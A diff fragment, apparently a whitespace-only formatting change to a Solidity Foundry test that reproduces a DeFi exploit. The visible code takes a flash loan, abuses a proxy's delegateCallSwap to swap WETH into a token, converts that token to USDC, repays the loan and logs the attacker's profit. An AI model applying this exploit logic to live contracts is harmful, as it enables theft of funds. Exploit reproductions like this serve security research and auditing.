@@ -49,7 +49,7 @@ contract ContractTest is Test {
 
         emit log_named_decimal_uint(
             "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
-            );
+        );
     }
 
     function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
@@ -59,13 +59,13 @@ contract ContractTest is Test {
         bytes memory swapData =
             abi.encodeWithSelector(0xa9678a18, address(Router), address(WETH), address(MYTOKEN), swapAmount);
         phxProxy.delegateCallSwap(swapData); // WETH swap to MYTOKEN
-        
+
         address[] memory path = new address[](3);
         path[0] = address(MYTOKEN);
         path[1] = address(WETH);
         path[2] = address(USDC);
         Router.swapExactTokensForTokens(1_000_000 * 1e18, 0, path, address(this), block.timestamp); // MYTOKEN swap to USDC
-        
+
         USDC.transfer(dodo, 8000 * 1e6);
     }
 }
